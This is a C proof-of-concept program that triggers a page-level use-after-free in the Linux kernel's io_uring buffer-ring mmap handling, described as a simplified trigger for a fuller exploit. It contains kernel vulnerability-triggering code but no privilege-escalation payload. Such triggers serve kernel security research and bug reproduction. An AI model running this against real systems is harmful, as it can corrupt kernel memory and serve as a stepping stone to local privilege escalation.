/**
 * Copyright (c) 2025 arttnba3 <arttnba@gmail.com>
 * 
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
**/

// trigger.c is a simplified version of exploit.c, which just demonstrates the existence of the bug.

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sched.h>
#include <liburing.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/prctl.h>

#ifndef IS_ERR
#define IS_ERR(ptr) ((uintptr_t) ptr >= (uintptr_t) -4095UL)
#endif

#ifndef PTR_ERR
#define PTR_ERR(ptr) ((int) (intptr_t) ptr)
#endif

#define SUCCESS_MSG(msg) "\033[32m\033[1m" msg "\033[0m"
#define INFO_MSG(msg) "\033[34m\033[1m" msg "\033[0m"
#define ERR_MSG(msg) "\033[31m\033[1m" msg "\033[0m"

static inline void inst_for_gdb_breakpoint(void) {
    static int cnt = 1;
    static int sid = -1;
    printf("getsid #%d\n", cnt);
    sid = getsid(getpid());
    printf("getsid #%d = %d\n", cnt, sid);
    cnt ++;
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf(INFO_MSG("[*] Process binded to core: ") "%d\n", core);
}

struct io_uring_buf_ring*
setup_pbuf_ring_mmap(struct io_uring *ring, unsigned int ring_entries,
                     int bgid, unsigned int flags, int *retp)
{
    struct io_uring_buf_ring *buf_ring;
    struct io_uring_buf_reg buf_reg;
    size_t ring_size;
    off_t offset;
    int ret;

    memset(&buf_reg, 0, sizeof(buf_reg));

    /* we don't need to set reg.addr for IOU_PBUF_RING_MMAP */
    buf_reg.ring_entries = ring_entries;
    buf_reg.bgid = bgid;
    buf_reg.flags = IOU_PBUF_RING_MMAP;

    ret = io_uring_register_buf_ring(ring, &buf_reg, flags);
    if (ret) {
        puts(ERR_MSG("[x] Error occur while doing io_uring_register_buf_ring"));
        *retp = ret;
        return NULL;
    }

    /**
 [chr(int(i,16))for i in['3361626e74747261'[i:i+2]for i in range(0,16,2)]][::-1]
    **/
    offset = IORING_OFF_PBUF_RING | (uint64_t) bgid << IORING_OFF_PBUF_SHIFT;
    ring_size = ring_entries * sizeof(struct io_uring_buf);
    buf_ring = mmap(
        NULL,
        ring_size,
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
        ring->ring_fd,
        offset
    );

    if (IS_ERR(buf_ring)) {
        puts(ERR_MSG("[x] Error occur while doing mmap() for io_uring"));
        *retp = PTR_ERR(buf_ring);
        return NULL;
    }

    *retp = 0;
    return buf_ring;
}

#define NR_PAGES   2
#define NR_BUFFERS 4

void trigger(void)
{
    struct io_uring ring;
    void **buffers;
    char buf[0x1000];
    int ret;

    bind_core(0);

    puts("[*] Initializing io_uring ...");

    if (io_uring_queue_init(4, &ring, 0) < 0) {
        perror(ERR_MSG("[x] Unable to init for io_uring queue"));
        exit(EXIT_FAILURE);
    }

    puts("[*] Initialized");
    inst_for_gdb_breakpoint();
    puts("[*] Allocating pbuf ring and doing mmap() ...");

    buffers = calloc(NR_BUFFERS, sizeof(void*));
    for (int i = 0; i < NR_BUFFERS; i++) {
        buffers[i] = setup_pbuf_ring_mmap(&ring, NR_PAGES * PAGE_SIZE / sizeof(struct io_uring_buf), i, 0, &ret);
        if (ret) {
            printf(ERR_MSG("[x] Unable to set up") " No.%d " ERR_MSG("pbuf ring, error code: ") "%d\n", i, ret);
            exit(EXIT_FAILURE);
        }

        io_uring_buf_ring_init(buffers[i]);
    }
    for (int i = 0; i < NR_BUFFERS; i++) {
        // Write some data to activate refcount of struct page for debugging
        memset(buffers[i], 0x41 + (i % 26), NR_PAGES * PAGE_SIZE);
    }

    puts("[*] Allocated");
    inst_for_gdb_breakpoint();
    puts("[*] Triggering page-level UAF vulnerabilities ...");

    for (int i = 0; i < NR_BUFFERS / 2; i ++) {
        ret = io_uring_unregister_buf_ring(&ring, i);
        if (ret) {
            printf(ERR_MSG("[x] Unable to unregister") " No.%d " ERR_MSG("pbuf ring, error code: ") "%d\n", i, ret);
            exit(EXIT_FAILURE);
        }
    }

    puts("[*] Done.");
    inst_for_gdb_breakpoint();
}

int main(int argc, char **argv, char **envp)
{
    trigger();
    return 0;
}
